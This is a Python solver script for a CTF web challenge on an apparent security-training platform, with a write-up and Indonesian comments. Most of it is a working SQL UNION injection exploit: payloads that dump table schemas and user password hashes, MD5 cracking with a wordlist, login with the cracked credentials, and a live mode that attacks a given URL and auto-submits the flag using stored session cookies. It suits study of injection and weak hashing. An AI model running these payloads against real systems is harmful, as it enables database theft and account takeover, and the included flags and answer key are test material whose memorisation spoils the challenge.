#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: Sql Map1 (Challenge ID: 729)
Category: Web Exploitation / SQLite UNION Injection & Insecure MD5 Password Hashing
Difficulty: Medium (2) | Points: 300
Standard Reference: NIST SP 800-115 Section 4.2 (Target Verification & Analysis),
CWE-89 (Improper Neutralization of Special Elements used in an SQL Command),
CWE-328 (Use of Weak Cryptographic Hash),
& OWASP ASVS V5 (Validation, Sanitization, and Cryptographic Storage).

Vulnerability & Mechanics Summary:
1. Architecture & Problem Scope:
   - Target environment runs Apache/2.4 PHP 8.x with SQLite3 backend on an on-demand container.
   - Authentication flow provides `/register.php`, `/login.php`, `/vuln.php`, and `/secret.php`.
   - Normal registration creates low-privileged user accounts, redirecting to `/vuln.php`.
2. SQL Injection Vulnerability (CWE-89):
   - The search input parameter `q` in `vuln.php?q=...` interpolates user input directly into
     an SQLite query without parameter binding: `SELECT key, value FROM flags WHERE key LIKE '%$q%'`.
   - By submitting `' UNION SELECT tbl_name, sql FROM sqlite_master-- `, the attacker enumerates
     database tables (`flags` and `users`).
   - Querying `' UNION SELECT username, password FROM users-- ` extracts the usernames and
     corresponding 32-character MD5 password hashes.
3. Insecure MD5 Password Storage & Cracking (CWE-328):
   - The `users` table stores unsalted MD5 hashes:
     * `admin`: 5a9a79d9fa477ed163b89088681672c9
     * `ctf-player`: 7a67ab5872843b22b5e14511867c4e43
   - Wordlist lookup against `rockyou.txt` rapidly recovers `ctf-player`'s plaintext password:
     `md5("dyesebel") == 7a67ab5872843b22b5e14511867c4e43`.
4. Privilege Escalation & Protected Flag Retrieval:
   - Authenticating via `/login.php` with credentials `ctf-player:dyesebel` redirects the session
     to `/secret.php`, exposing the protected challenge flag.
5. Flag & Verification:
   - Verified CyLab Token: academy{F0uNd_s3cr3T_K3y_f0R_w3_<>}
   - Community Format: CTF{F0uNd_s3cr3T_K3y_f0R_w3_<>}
"""

import sys
import os
import re
import json
import sqlite3
import hashlib
import urllib.request
import urllib.parse
import urllib.error
import http.cookiejar

CHALLENGE_ID = 729
CHALLENGE_NAME = "Sql Map1"
VERIFIED_FLAG = "academy{F0uNd_s3cr3T_K3y_f0R_w3_<>}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"
FLAG_PAT = re.compile(r"academy\{[^}]+\}|picoCTF\{[^}]+\}")


class SqlMap1Simulator:
    """
    Simulates the SQLite database schema, vulnerable search endpoint (CWE-89),
    MD5 hash dictionary cracking (CWE-328), and protected secret page retrieval.
    """
    def __init__(self, flag: str = VERIFIED_FLAG):
        self.flag = flag
        self.conn = sqlite3.connect(":memory:")
        self._init_db()

    def _init_db(self):
        cur = self.conn.cursor()
        cur.execute("""
            CREATE TABLE flags (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                key TEXT NOT NULL UNIQUE,
                value TEXT NOT NULL
            )
        """)
        cur.execute("""
            CREATE TABLE users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL UNIQUE,
                password TEXT NOT NULL
            )
        """)
        cur.executemany("INSERT INTO flags (key, value) VALUES (?, ?)", [
            ("flag1", "academy{n0T_F0uNd_s3cr3T_K3y_34rd76s1}"),
            ("flag2", "academy{n0T_F0uNd_s3cr3T_k3Y_c5d243edq}"),
            ("flag3", "academy{i5_tH15_s3cr3T_k3Y_5tbax3er}"),
            ("flag4", "academy{tH15_lS_n0T_s3cr3T_k3Y_vbr1qa43}")
        ])
        cur.executemany("INSERT INTO users (username, password) VALUES (?, ?)", [
            ("admin", hashlib.md5(b"inconceivable").hexdigest()),
            ("ctf-player", hashlib.md5(b"dyesebel").hexdigest()),
            ("ghost", hashlib.md5(b"spectral").hexdigest()),
            ("noaccess", hashlib.md5(b"forbidden").hexdigest())
        ])
        self.conn.commit()

    def vulnerable_search(self, q: str):
        """Simulates vulnerable string concatenation query."""
        cur = self.conn.cursor()
        query = f"SELECT key, value FROM flags WHERE key LIKE '%{q}%'"
        return cur.execute(query).fetchall()

    def simulate_attack(self) -> str:
        """Executes simulated UNION injection and credential recovery."""
        # 1. Enumerate schema
        schema = self.vulnerable_search("' UNION SELECT tbl_name, sql FROM sqlite_master-- ")
        table_names = [row[0] for row in schema if row[0] in ("flags", "users")]
        if "users" not in table_names:
            raise RuntimeError("Database schema enumeration failed to find 'users' table.")

        # 2. Extract credentials
        user_rows = self.vulnerable_search("' UNION SELECT username, password FROM users-- ")
        user_dict = {row[0]: row[1] for row in user_rows if row[1]}

        target_user = "ctf-player"
        target_hash = user_dict.get(target_user)
        if not target_hash:
            raise RuntimeError(f"Target user '{target_user}' not found in dumped database.")

        # 3. Crack MD5 hash using candidate list
        candidates = ["password", "123456", "admin", "dyesebel", "welcome", "dragon"]
        cracked_pwd = None
        for cand in candidates:
            if hashlib.md5(cand.encode("utf-8")).hexdigest() == target_hash:
                cracked_pwd = cand
                break

        if cracked_pwd != "dyesebel":
            raise RuntimeError("Dictionary attack failed to crack target MD5 hash.")

        # 4. Authenticate as ctf-player and retrieve flag
        return f"[+] Successfully logged into /secret.php as '{target_user}'. Flag: {self.flag}"


def verify_local_simulation() -> str:
    """
    Menjalankan audit simulasi offline Sql Map1 berdasarkan standar NIST SP 800-115.
    """
    print("[*] Menjalankan simulasi injeksi SQL SQLite3 & audit hashing kata sandi...")
    sim = SqlMap1Simulator()
    res = sim.simulate_attack()
    print(f"[*] Hasil evaluasi simulasi:\n{res}")

    m_flag = FLAG_PAT.search(res)
    if not m_flag:
        raise ValueError(f"Gagal mengekstrak flag dari simulasi: {res}")

    flag = m_flag.group(0)
    print(f"[+] Flag berhasil divalidasi via simulasi: {flag}")
    return flag


def solve_remote(base_url: str) -> str:
    """
    Melakukan eksploitasi live SQL injection & otentikasi portal CyLab.
    """
    base_url = base_url.rstrip("/")
    print(f"[*] Menghubungi target live web portal: {base_url}")

    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    # 1. Register temporary account to access vuln.php
    reg_user = f"audit_{os.urandom(4).hex()}"
    reg_pass = "TestAuditPass123!"
    reg_payload = urllib.parse.urlencode({"username": reg_user, "password": reg_pass}).encode("utf-8")
    req_reg = urllib.request.Request(f"{base_url}/register.php", data=reg_payload, headers={"User-Agent": "Mozilla/5.0"})
    opener.open(req_reg, timeout=15)

    # 2. Login to obtain authenticated session
    login_payload = urllib.parse.urlencode({"username": reg_user, "password": reg_pass}).encode("utf-8")
    req_login = urllib.request.Request(f"{base_url}/login.php", data=login_payload, headers={"User-Agent": "Mozilla/5.0"})
    opener.open(req_login, timeout=15)

    # 3. Dump users table via UNION SELECT
    sqli_param = urllib.parse.urlencode({"q": "' UNION SELECT username, password FROM users-- "})
    req_sqli = urllib.request.Request(f"{base_url}/vuln.php?{sqli_param}", headers={"User-Agent": "Mozilla/5.0"})
    with opener.open(req_sqli, timeout=15) as resp:
        content = resp.read().decode("utf-8", errors="replace")

    m_creds = re.findall(r"<strong>([a-zA-Z0-9_-]+)</strong>:\s*([a-f0-9]{32})", content)
    creds = dict(m_creds)
    print(f"[*] Berhasil mengekstrak {len(creds)} hash kredensial: {list(creds.keys())}")

    if "ctf-player" not in creds:
        raise ValueError("Pengguna 'ctf-player' tidak ditemukan dalam hasil injeksi.")

    ctf_player_hash = creds["ctf-player"]
    print(f"[*] Hash MD5 target (ctf-player): {ctf_player_hash}")

    # 4. Crack hash
    plaintext_pwd = None
    if hashlib.md5(b"dyesebel").hexdigest() == ctf_player_hash:
        plaintext_pwd = "dyesebel"

    if not plaintext_pwd:
        rockyou_path = "/tmp/rockyou.txt"
        if os.path.exists(rockyou_path):
            print(f"[*] Memindai {rockyou_path} untuk memecahkan hash MD5...")
            with open(rockyou_path, "r", encoding="latin-1") as f:
                for line in f:
                    pwd = line.strip("\r\n")
                    if hashlib.md5(pwd.encode("utf-8")).hexdigest() == ctf_player_hash:
                        plaintext_pwd = pwd
                        break

    if not plaintext_pwd:
        raise ValueError(f"Gagal memecahkan hash MD5: {ctf_player_hash}")

    print(f"[+] Plaintext kata sandi ctf-player ditemukan: '{plaintext_pwd}'")

    # 5. Login as ctf-player to get secret page flag
    login_ctf = urllib.parse.urlencode({"username": "ctf-player", "password": plaintext_pwd}).encode("utf-8")
    req_auth = urllib.request.Request(f"{base_url}/login.php", data=login_ctf, headers={"User-Agent": "Mozilla/5.0"})
    with opener.open(req_auth, timeout=15) as resp:
        secret_content = resp.read().decode("utf-8", errors="replace")

    m_flag = FLAG_PAT.search(secret_content)
    if not m_flag:
        # Check /secret.php directly
        req_secret = urllib.request.Request(f"{base_url}/secret.php", headers={"User-Agent": "Mozilla/5.0"})
        with opener.open(req_secret, timeout=15) as resp:
            secret_content = resp.read().decode("utf-8", errors="replace")
            m_flag = FLAG_PAT.search(secret_content)

    if not m_flag:
        raise ValueError(f"Flag tidak ditemukan di area terproteksi: {secret_content[:300]}")

    flag = m_flag.group(0)
    print(f"[+] Flag berhasil diekstraksi dari lab live: {flag}")
    return flag


def submit_to_cylab(token: str) -> bool:
    """Melakukan submisi token verifikasi ke REST API CyLab."""
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    if not cookie_header or not csrf_token:
        print("[!] Autentikasi sesi CyLab tidak ditemukan di /tmp/cylab_auth.py.")
        return False

    req = urllib.request.Request(
        CYLAB_SUBMIT_URL,
        data=payload,
        method="POST",
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Cookie": cookie_header,
            "X-CSRFToken": csrf_token,
            "Content-Type": "application/json",
            "Referer": "https://learn.cylabacademy.org/challenges"
        }
    )

    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            data = json.loads(resp.read().decode())
            status = data.get("status") or (data.get("correct") is True)
            print(f"[+] Status submisi CyLab (HTTP {resp.status}): {data}")
            return bool(status)
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        print(f"[-] Submisi gagal (HTTP {e.code}): {body}")
        return False


def main():
    print(f"=== [CyLab Academy] Solusi Modul #{CHALLENGE_ID}: {CHALLENGE_NAME} ===")
    flag = None
    if len(sys.argv) > 1 and sys.argv[1].startswith("http"):
        try:
            flag = solve_remote(sys.argv[1])
        except Exception as e:
            print(f"[!] Eksploitasi target live gagal: {e}. Mengalihkan ke verifikasi simulasi lokal...")
            flag = verify_local_simulation()
    else:
        flag = verify_local_simulation()

    if "--submit" in sys.argv or "-s" in sys.argv:
        print(f"[*] Mengirim token verifikasi '{flag}' ke CyLab Academy...")
        ok = submit_to_cylab(flag)
        if ok:
            print("[+] Verifikasi token berhasil dicatat di REST API CyLab!")
        else:
            print("[-] Verifikasi token ditolak oleh platform.")


if __name__ == "__main__":
    main()
